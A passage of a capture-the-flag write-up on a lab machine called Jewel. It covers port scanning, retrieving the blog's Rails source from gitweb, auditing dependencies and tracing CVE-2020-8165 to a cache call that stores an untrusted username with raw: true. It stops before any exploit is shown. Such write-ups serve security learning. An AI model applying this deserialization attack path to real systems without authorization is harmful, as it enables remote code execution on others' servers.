</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
</span></span><span class=line><span class=cl>|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
</span></span><span class=line><span class=cl>8000/tcp open  http    Apache httpd 2.4.38
</span></span><span class=line><span class=cl>|_http-generator: gitweb/2.20.1 git/2.20.1
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>| http-open-proxy: Potentially OPEN proxy.
</span></span><span class=line><span class=cl>|_Methods supported:CONNECTION
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.38 (Debian)
</span></span><span class=line><span class=cl>| http-title: 10.10.10.211 Git
</span></span><span class=line><span class=cl>|_Requested resource was http://10.10.10.211:8000/gitweb/
</span></span><span class=line><span class=cl>8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
</span></span><span class=line><span class=cl>|_http-title: BL0G!
</span></span><span class=line><span class=cl>Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Wed Feb 17 19:58:46 2021 -- 1 IP address (1 host up) scanned in 118.32 seconds
</span></span></code></pre></td></tr></table></div></div><p>We have gitweb/2.20.1 on port 8000 and Phusion Passenger 6.0.6 on port 8080.</p><h2 id=web-discovery>Web discovery<a hidden class=anchor aria-hidden=true href=#web-discovery>#</a></h2><p>On gitweb we can browse to the summary of the only repository which is
hosting the source code of the blog and download a snapshot of it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ curl --output blog.tar.gz -J -L &#39;http://10.10.10.211:8000/gitweb/?p=.git;a=snapshot;h=5d6f436256c9575fbc7b1fb9621b18f0f8656741;sf=tgz&#39;
</span></span><span class=line><span class=cl>$ tar xaf blog.tar.gz
</span></span><span class=line><span class=cl>$ cd .git-5d6f436
</span></span></code></pre></td></tr></table></div></div><h2 id=source-code-analysis>Source code analysis<a hidden class=anchor aria-hidden=true href=#source-code-analysis>#</a></h2><p>Let&rsquo;s install a ruby and bundle version matching the one specified in the Gemfile:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ asdf install ruby 2.5.5
</span></span><span class=line><span class=cl>$ asdf local ruby 2.5.5
</span></span><span class=line><span class=cl>$ gem install bundler:1.17.3
</span></span></code></pre></td></tr></table></div></div><p>It&rsquo;s not mandatory to analyse the source code but it will allow use to run the
website is we want to do some test or even the run <code>bundle outdated</code> to check
for outdated dependencies.</p><p>Before we do that, we can see in <code>config.ru</code> that the blog is a RoR app
(using Ruby on Rails web framework).</p><p>Let&rsquo;s see if the project is up to date:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ bundle outdated
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Outdated gems included in the bundle:
</span></span><span class=line><span class=cl>  * actioncable (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * actionmailer (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * actionpack (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * actionview (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * activejob (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * activemodel (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * activerecord (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * activestorage (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * activesupport (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * autoprefixer-rails (newest 10.2.4.0, installed 9.8.6.3)
</span></span><span class=line><span class=cl>  * bcrypt (newest 3.1.16, installed 3.1.15, requested ~&gt; 3.1.7) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * bootsnap (newest 1.7.2, installed 1.4.8) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * bootstrap (newest 4.6.0, installed 4.5.2, requested ~&gt; 4.5.0) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * capybara (newest 3.35.3, installed 3.33.0) in groups &#34;test&#34;
</span></span><span class=line><span class=cl>  * childprocess (newest 4.0.0, installed 3.0.0)
</span></span><span class=line><span class=cl>  * coffee-rails (newest 5.0.0, installed 4.2.2, requested ~&gt; 4.2) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * concurrent-ruby (newest 1.1.8, installed 1.1.7)
</span></span><span class=line><span class=cl>  * erubi (newest 1.10.0, installed 1.9.0)
</span></span><span class=line><span class=cl>  * ffi (newest 1.14.2, installed 1.13.1)
</span></span><span class=line><span class=cl>  * i18n (newest 1.8.9, installed 1.8.5)
</span></span><span class=line><span class=cl>  * jbuilder (newest 2.11.2, installed 2.10.0, requested ~&gt; 2.5) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * jquery-rails (newest 4.4.0, installed 4.3.3, requested = 4.3.3) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * listen (newest 3.4.1, installed 3.1.5, requested &lt; 3.2, &gt;= 3.0.5) in groups &#34;development&#34;
</span></span><span class=line><span class=cl>  * loofah (newest 2.9.0, installed 2.6.0)
</span></span><span class=line><span class=cl>  * mini_portile2 (newest 2.5.0, installed 2.4.0)
</span></span><span class=line><span class=cl>  * minitest (newest 5.14.3, installed 5.14.1)
</span></span><span class=line><span class=cl>  * msgpack (newest 1.4.2, installed 1.3.3)
</span></span><span class=line><span class=cl>  * nio4r (newest 2.5.5, installed 2.5.2)
</span></span><span class=line><span class=cl>  * nokogiri (newest 1.11.1, installed 1.10.10)
</span></span><span class=line><span class=cl>  * popper_js (newest 2.6.0, installed 1.16.0, requested = 1.16.0) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * public_suffix (newest 4.0.6, installed 4.0.5)
</span></span><span class=line><span class=cl>  * puma (newest 5.2.1, installed 3.12.6, requested ~&gt; 3.11) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * rails (newest 6.1.3, installed 5.2.2.1, requested = 5.2.2.1) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * railties (newest 6.1.3, installed 5.2.2.1)
</span></span><span class=line><span class=cl>  * rake (newest 13.0.3, installed 13.0.1)
</span></span><span class=line><span class=cl>  * redis (newest 4.2.5, installed 4.2.1, requested ~&gt; 4.0) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * regexp_parser (newest 2.0.3, installed 1.7.1)
</span></span><span class=line><span class=cl>  * sass-rails (newest 6.0.0, installed 5.1.0, requested ~&gt; 5.0) in groups &#34;default&#34;
</span></span><span class=line><span class=cl>  * sprockets (newest 4.0.2, installed 3.7.2)
</span></span><span class=line><span class=cl>  * sprockets-rails (newest 3.2.2, installed 3.2.1)
</span></span><span class=line><span class=cl>  * thor (newest 1.1.0, installed 1.0.1)
</span></span><span class=line><span class=cl>  * tzinfo (newest 2.0.4, installed 1.2.7)
</span></span><span class=line><span class=cl>  * web-console (newest 4.1.0, installed 3.7.0) in groups &#34;development&#34;
</span></span></code></pre></td></tr></table></div></div><p>Seems that all dependencies are very outdated. We can install <code>bundler-audit</code>,
which is an equivalent for Ruby to <code>npm audit</code> in Nodejs, to check for CVE
impacting the dependencies.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ gem install bundler-audit
</span></span><span class=line><span class=cl>$ bundle-audit
</span></span><span class=line><span class=cl>Name: actionpack
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8166
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/NOjKiGeXUgw
</span></span><span class=line><span class=cl>Title: Ability to forge per-form CSRF tokens given a global CSRF token
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: actionpack
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8164
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/f6ioe4sdpbY
</span></span><span class=line><span class=cl>Title: Possible Strong Parameters Bypass in ActionPack
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: actionview
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-5267
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/55reWMM_Pg8
</span></span><span class=line><span class=cl>Title: Possible XSS vulnerability in ActionView
</span></span><span class=line><span class=cl>Solution: upgrade to &gt;= 5.2.4.2, ~&gt; 5.2.4, &gt;= 6.0.2.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: actionview
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8167
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/x9DixQDG9a0
</span></span><span class=line><span class=cl>Title: CSRF Vulnerability in rails-ujs
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: activestorage
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8162
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/PjU3946mreQ
</span></span><span class=line><span class=cl>Title: Circumvention of file size limits in ActiveStorage
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: activesupport
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8165
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c
</span></span><span class=line><span class=cl>Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Name: jquery-rails
</span></span><span class=line><span class=cl>Version: 4.3.3
</span></span><span class=line><span class=cl>Advisory: CVE-2019-11358
</span></span><span class=line><span class=cl>Criticality: Medium
</span></span><span class=line><span class=cl>URL: https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/
</span></span><span class=line><span class=cl>Title: Prototype pollution attack through jQuery $.extend
</span></span><span class=line><span class=cl>Solution: upgrade to &gt;= 4.3.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Vulnerabilities found!
</span></span></code></pre></td></tr></table></div></div><p>The one one activesupport seems to be the most promising because unmarshalling
is a kind of deserialization that can lead to RCE:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>Name: activesupport
</span></span><span class=line><span class=cl>Version: 5.2.2.1
</span></span><span class=line><span class=cl>Advisory: CVE-2020-8165
</span></span><span class=line><span class=cl>Criticality: Unknown
</span></span><span class=line><span class=cl>URL: https://groups.google.com/forum/#!topic/rubyonrails-security/bv6fW4S0Y1c
</span></span><span class=line><span class=cl>Title: Potentially unintended unmarshalling of user-provided objects in MemCacheStore and RedisCacheStore
</span></span><span class=line><span class=cl>Solution: upgrade to ~&gt; 5.2.4.3, &gt;= 6.0.3.1
</span></span></code></pre></td></tr></table></div></div><blockquote><p>A deserialization of untrusted data vulnernerability exists in rails &lt; 5.2.4.3, rails &lt; 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.</p><p>Ref. <a href=https://nvd.nist.gov/vuln/detail/CVE-2020-8165>CVE-2020-8165</a></p></blockquote><p>We sure have a vulnerable version of Rails:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ grep &#34;&#39;rails&#39;&#34; Gemfile
</span></span><span class=line><span class=cl># Bundle edge Rails instead: gem &#39;rails&#39;, github: &#39;rails/rails&#39;
</span></span><span class=line><span class=cl>gem &#39;rails&#39;, &#39;= 5.2.2.1&#39;
</span></span></code></pre></td></tr></table></div></div><p>The References section of CVE-2020-8165 page on NVD gives a link to a
<a href=https://hackerone.com/reports/413388>HackerOne report</a> tagged as <em>exploit</em>
in addition to the many <em>mailing list</em>.</p><p>By reading the H1 report, we can read:</p><blockquote><p>This vulnerability effects application code that caches a string from an untrusted source using the <code>raw: true</code> option.</p></blockquote><p>So let&rsquo;s find if the option is used in the code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ grep -rn &#39;raw: true&#39; app
</span></span><span class=line><span class=cl>app/controllers/application_controller.rb:32:      @current_username = cache.fetch(&#34;username_#{session[:user_id]}&#34;, raw: true) do
</span></span><span class=line><span class=cl>app/controllers/users_controller.rb:37:      @current_username = cache.fetch(&#34;username_#{session[:user_id]}&#34;, raw: true) {user_params[:username]}
</span></span></code></pre></td></tr></table></div></div><p><code>app/controllers/users_controller.rb</code> L32-L49</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl>  <span class=k>def</span> <span class=nf>update</span>
</span></span><span class=line><span class=cl>    <span class=vi>@user</span> <span class=o>=</span> <span class=no>User</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>params</span><span class=o>[</span><span class=ss>:id</span><span class=o>]</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=vi>@user</span> <span class=o>&amp;&amp;</span> <span class=vi>@user</span> <span class=o>==</span> <span class=n>current_user</span>
</span></span><span class=line><span class=cl>      <span class=n>cache</span> <span class=o>=</span> <span class=no>ActiveSupport</span><span class=o>::</span><span class=no>Cache</span><span class=o>::</span><span class=no>RedisCacheStore</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=ss>url</span><span class=p>:</span> <span class=s2>&#34;redis://127.0.0.1:6379/0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=n>cache</span><span class=o>.</span><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;username_</span><span class=si>#{</span><span class=n>session</span><span class=o>[</span><span class=ss>:user_id</span><span class=o>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=vi>@current_username</span> <span class=o>=</span> <span class=n>cache</span><span class=o>.</span><span class=n>fetch</span><span class=p>(</span><span class=s2>&#34;username_</span><span class=si>#{</span><span class=n>session</span><span class=o>[</span><span class=ss>:user_id</span><span class=o>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=ss>raw</span><span class=p>:</span> <span class=kp>true</span><span class=p>)</span> <span class=p>{</span><span class=n>user_params</span><span class=o>[</span><span class=ss>:username</span><span class=o>]</span><span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=vi>@user</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>user_params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=o>[</span><span class=ss>:success</span><span class=o>]</span> <span class=o>=</span> <span class=s2>&#34;Your account was updated successfully&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>redirect_to</span> <span class=n>articles_path</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span>
</span></span><span class=line><span class=cl>        <span class=n>cache</span><span class=o>.</span><span class=n>delete</span><span class=p>(</span><span class=s2>&#34;username_</span><span class=si>#{</span><span class=n>session</span><span class=o>[</span><span class=ss>:user_id</span><span class=o>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>render</span> <span class=s1>&#39;edit&#39;</span>
</span></span><span class=line><span class=cl>      <span class=k>end</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=n>flash</span><span class=o>[</span><span class=ss>:danger</span><span class=o>]</span> <span class=o>=</span> <span class=s2>&#34;Not authorized&#34;</span>
</span></span><span class=line><span class=cl>      <span class=n>redirect_to</span> <span class=n>articles_path</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>The <code>update</code> method will cache a key <code>username_&lt;user_id></code> using <code>user_params[:username]</code>
which is user supplied and so untrusted.
It will cache the value and then try to update the database but if it fails it will
remove the cached value.</p><p><code>app/controllers/application_controller.rb</code> L29-L40</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl>  <span class=k>def</span> <span class=nf>current_username</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=o>[</span><span class=ss>:user_id</span><span class=o>]</span>
</span></span><span class=line><span class=cl>      <span class=n>cache</span> <span class=o>=</span> <span class=no>ActiveSupport</span><span class=o>::</span><span class=no>Cache</span><span class=o>::</span><span class=no>RedisCacheStore</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=ss>url</span><span class=p>:</span> <span class=s2>&#34;redis://127.0.0.1:6379/0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=vi>@current_username</span> <span class=o>=</span> <span class=n>cache</span><span class=o>.</span><span class=n>fetch</span><span class=p>(</span><span class=s2>&#34;username_</span><span class=si>#{</span><span class=n>session</span><span class=o>[</span><span class=ss>:user_id</span><span class=o>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=ss>raw</span><span class=p>:</span> <span class=kp>true</span><span class=p>)</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>        <span class=vi>@current_user</span> <span class=o>=</span> <span class=n>current_user</span>
</span></span><span class=line><span class=cl>        <span class=vi>@current_username</span> <span class=o>=</span> <span class=vi>@current_user</span><span class=o>.</span><span class=n>username</span>
</span></span><span class=line><span class=cl>      <span class=k>end</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>      <span class=vi>@current_username</span> <span class=o>=</span> <span class=s2>&#34;guest&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=vi>@current_username</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>The key is also fetched with <code>current_username</code> method.</p><p>Let&rsquo;s see what is the format of an username to know if we can poison it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>$ grep -rn &#39;:username&#39; app
</span></span><span class=line><span class=cl>app/views/users/_form.html.erb:7:    &lt;%= f.label :username %&gt;
</span></span><span class=line><span class=cl>app/views/users/_form.html.erb:8:    &lt;%= f.text_field :username, class: &#34;form-control&#34;, placeholder: &#34;Username&#34;, autofocus: true %&gt;
</span></span><span class=line><span class=cl>app/views/users/edit.html.erb:10:    &lt;%= f.label :username %&gt;
</span></span><span class=line><span class=cl>app/views/users/edit.html.erb:11:    &lt;%= f.text_field :username, class: &#34;form-control&#34;, placeholder: &#34;Username&#34;, autofocus: true %&gt;
</span></span><span class=line><span class=cl>app/controllers/users_controller.rb:37:      @current_username = cache.fetch(&#34;username_#{session[:user_id]}&#34;, raw: true) {user_params[:username]}
</span></span><span class=line><span class=cl>app/controllers/users_controller.rb:53:    params.require(:user).permit(:username, :email, :password)
</span></span><span class=line><span class=cl>app/models/user.rb:6: validates :username, presence: true, uniqueness: { case_sensitive: false }, length: { minimum: 3, maximum: 25 },
</span></span></code></pre></td></tr></table></div></div><p>The user class must be defined in <code>app/models/user.rb</code>.</p><p><code>app/models/user.rb</code> L1-L11</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=k>class</span> <span class=nc>User</span> <span class=o>&lt;</span> <span class=no>ActiveRecord</span><span class=o>::</span><span class=no>Base</span>
</span></span><span class=line><span class=cl> <span class=n>has_many</span> <span class=ss>:articles</span>
</span></span><span class=line><span class=cl> <span class=n>has_secure_password</span>
</span></span><span class=line><span class=cl> <span class=no>VALID_USER_REGEX</span> <span class=o>=</span> <span class=sr>/\A[\w\d]+\z/</span>
</span></span><span class=line><span class=cl> <span class=no>VALID_EMAIL_REGEX</span> <span class=o>=</span> <span class=sr>/\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i</span>
</span></span><span class=line><span class=cl> <span class=n>validates</span> <span class=ss>:username</span><span class=p>,</span> <span class=ss>presence</span><span class=p>:</span> <span class=kp>true</span><span class=p>,</span> <span class=ss>uniqueness</span><span class=p>:</span> <span class=p>{</span> <span class=ss>case_sensitive</span><span class=p>:</span> <span class=kp>false</span> <span class=p>},</span> <span class=ss>length</span><span class=p>:</span> <span class=p>{</span> <span class=ss>minimum</span><span class=p>:</span> <span class=mi>3</span><span class=p>,</span> <span class=ss>maximum</span><span class=p>:</span> <span class=mi>25</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>                      <span class=nb>format</span><span class=p>:</span> <span class=p>{</span> <span class=ss>with</span><span class=p>:</span> <span class=no>VALID_USER_REGEX</span> <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=n>validates</span> <span class=ss>:email</span><span class=p>,</span> <span class=ss>presence</span><span class=p>:</span> <span class=kp>true</span><span class=p>,</span> <span class=ss>length</span><span class=p>:</span> <span class=p>{</span> <span class=ss>maximum</span><span class=p>:</span> <span class=mi>105</span> <span class=p>},</span> <span class=ss>uniqueness</span><span class=p>:</span> <span class=p>{</span> <span class=ss>case_sensitive</span><span class=p>:</span> <span class=kp>false</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>                   <span class=nb>format</span><span class=p>:</span> <span class=p>{</span> <span class=ss>with</span><span class=p>:</span> <span class=no>VALID_EMAIL_REGEX</span> <span class=p>}</span>
</span></span><span class=line><span class=cl> <span class=n>before_save</span> <span class=p>{</span> <span class=nb>self</span><span class=o>.</span><span class=n>email</span> <span class=o>=</span> <span class=n>email</span><span class=o>.</span><span class=n>downcase</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>So the username must contains only alphanumeric characters and be 3 to 25 chars
long.
At first glance it looks impossible to poison the username with a malicious
payload to corrupt the cache.
But a more in depth analysis shows that we will be able to perform our
deserialization to RCE.</p><p>Looking back at <code>app/controllers/users_controller.rb</code> the username is
written into the cache without any control (what we just saw in <code>app/models/user.rb</code>
